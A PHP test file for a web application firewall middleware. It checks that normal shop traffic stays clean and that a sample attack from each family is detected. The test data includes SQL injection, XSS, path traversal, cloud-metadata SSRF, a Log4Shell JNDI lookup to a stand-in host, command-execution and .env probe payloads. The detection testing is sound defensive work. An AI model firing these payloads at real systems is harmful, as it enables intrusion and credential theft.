<?php

use Illuminate\Support\Facades\DB;

/*
 * End-to-end flow test: drive realistic traffic through the middleware and pin
 * two things the shipped config guarantees — that ordinary storefront traffic
 * produces no findings (the noise floor), and that a representative attack from
 * each family is detected (the coverage floor). Either one changing becomes a
 * decision someone has to make, rather than a silent regression in production.
 */

it('records nothing for ordinary storefront and account traffic', function () {
    $this->get('/')->assertOk();
    $this->get('/products?category=shoes&sort=price_asc')->assertOk();
    $this->get('/search?q='.rawurlencode('blue summer shirt'))->assertOk();
    $this->post('/cart', ['product_id' => 42, 'quantity' => 2])->assertOk();
    $this->post('/login', ['email' => 'user@example.com', 'password' => 'correcthorse'])->assertOk();
    $this->post('/account/profile', ['name' => 'Jane Doe', 'bio' => 'I love hiking and good coffee.'])->assertOk();

    expect(DB::table('waf_logs')->count())->toBe(0);
});

it('detects a representative attack from each family', function (string $method, string $uri, array $body, string $ruleId) {
    // Each attack rides its own IP so per-signature dedup never hides one.
    $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.'.crc32($ruleId) % 254])
        ->call($method, $uri, $body)
        ->assertOk();

    $ids = DB::table('waf_logs')->pluck('rule_ids')->implode(',');

    expect($ids)->toContain($ruleId);
})->with([
    'SQLi UNION' => ['GET', '/products?id='.rawurlencode("1' UNION SELECT pw FROM users--"), [], '942100'],
    'XSS script tag' => ['GET', '/search?q='.rawurlencode('<script>alert(1)</script>'), [], '941100'],
    'Path traversal' => ['GET', '/download?file='.rawurlencode('../../etc/passwd'), [], '930110'],
    'Cloud metadata' => ['GET', '/fetch?url='.rawurlencode('http://169.254.169.254/latest/meta-data/'), [], '934100'],
    'Log4Shell JNDI' => ['GET', '/api/lookup?q='.rawurlencode('${jndi:ldap://evil.example/a}'), [], '944150'],
    'Null byte' => ['GET', '/download?file='.rawurlencode("passwd\0.jpg"), [], '920270'],
    'PHP code exec' => ['POST', '/api/run', ['cmd' => 'system(id)'], '932110'],
]);

it('flags a decisive .env probe on the path alone', function () {
    $this->get('/.env')->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->type)->toContain('Environment File Access')
        ->and($log->confidence_score)->toBe(100); // decisive → full confidence
});
